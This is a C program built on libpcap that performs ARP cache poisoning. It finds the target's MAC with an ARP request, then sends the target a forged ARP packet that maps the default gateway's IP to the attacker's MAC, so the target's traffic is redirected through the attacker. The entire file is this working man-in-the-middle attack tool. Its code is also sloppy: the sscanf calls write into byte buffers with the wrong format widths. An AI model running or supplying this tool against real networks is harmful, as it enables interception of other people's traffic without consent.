#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pcap.h>

int main(int argc, char **argv)
{
    pcap_t *packet_start;
    char buf[PCAP_ERRBUF_SIZE];
    char tip[20];
    char sip[20];
    char gip[20];
    char m[20];
    unsigned char p[100];
    const u_char *pget;
    const u_char *get;
    int r;
    int loop=0;
    int i;
    packet_start = pcap_open_live("wlp1s0", 100, 1, 1000, buf); // Wlan Name need to be Input
    if (packet_start == NULL) 
    {
        fprintf(stderr, "No Device %s: %s\n", argv[1], buf);
        return -1;
    }
    p[0]=0xFF,p[1]=0xFF,p[2]=0xFF,p[3]=0xFF,p[4]=0xFF,p[5]=0xFF;
    printf("Choose IP : ");
    scanf("%s",&tip);
    FILE *fp;
    fp = popen( "ip addr | grep \"inet\" | grep brd | awk '{print $2}' | awk -F/ '{print $1}'", "r");
    if(fp==NULL)
    {
        perror("Error!\n");
        return -1;
    }
    fgets(sip, 20, fp);
    pclose(fp);
    fp = popen("ifconfig | grep HWaddr | awk '{print $5}'","r");
    if (fp ==NULL)
    {
        perror("Error!!\n");
        return -1;
    }
    fgets(m, 20, fp);
    pclose(fp);
    fp = popen("route | grep default | awk '{print $2}'","r");
    if (fp ==NULL)
    {
        perror("Error!!\n");
        return -1;
    }
    fgets(gip, 20, fp);
    pclose(fp);
    sscanf(m,"%x:%x:%x:%x:%x:%x",&p[6],&p[7],&p[8],&p[9],&p[10],&p[11]);
    p[12]=0x08,p[13]=0x06,p[14]=0x00,p[15]=0x01,p[16]=0x08,p[17]=0x00,p[18]=0x06,p[19]=0x04,p[20]=0x00,p[21]=0x01;
    sscanf(m,"%x:%x:%x:%x:%x:%x",&p[22],&p[23],&p[24],&p[25],&p[26],&p[27]);
    sscanf(sip,"%d.%d.%d.%d",&p[28],&p[29],&p[30],&p[31]);
    sscanf(tip,"%d.%d.%d.%d",&p[38],&p[39],&p[40],&p[41]);
    for(i=42;i<60;i++)
    {
        p[i]=i%256;
    }
    struct pcap_pkthdr *header;
        while(1)
	{
            if(loop==0)
            {
                printf("Send ARP \n");
                if (pcap_sendpacket(packet_start, p, 60) != 0)
                {
                    fprintf(stderr,"\nError!! \n", pcap_geterr(packet_start));
                    return -1;
                }
            }
            loop=(loop+1)%10;
            r=1;
            const int rst = pcap_next_ex(packet_start, &header, &pget);
            if(rst<0)
                break;
            else if(rst==0)
                continue;
            get = pget;
            for(int i=0;i<=5;i++)
            {
                if(*(get+i)!=p[i+6])
                {
                    r=0;
                    break;
                }
            }
            if(ntohs(*(short*)(get+12))==0x0800)
	    {
            }
            else if(ntohs(*(short*)(get+12))==0x0806)
	    {
                if(r)
                {
                    break;
                }
            }
        }
        if(r)
        {
            printf("Poisoning Clear!! \n");
            for(int i=0;i<6;i++)
            {
                p[i]=*(get+i+6);
            }
            sscanf(m,"%x:%x:%x:%x:%x:%x",&p[6],&p[7],&p[8],&p[9],&p[10],&p[11]);
            p[12]=0x08,p[13]=0x06,p[14]=0x00,p[15]=0x01,p[16]=0x08,p[17]=0x00,p[18]=0x06,p[19]=0x04,p[20]=0x00,p[21]=0x01;
            sscanf(m,"%x:%x:%x:%x:%x:%x",&p[22],&p[23],&p[24],&p[25],&p[26],&p[27]);
            sscanf(gip,"%d.%d.%d.%d",&p[28],&p[29],&p[30],&p[31]);
            sscanf(tip,"%d.%d.%d.%d",&p[38],&p[39],&p[40],&p[41]);
            for(i=42;i<60;i++)
            {
                p[i]=i%256;
            }
            if (pcap_sendpacket(packet_start, p, 60) != 0)
            {
                fprintf(stderr,"\nError: \n", pcap_geterr(packet_start));
                return -1;
            }
        }
    return 0;
}
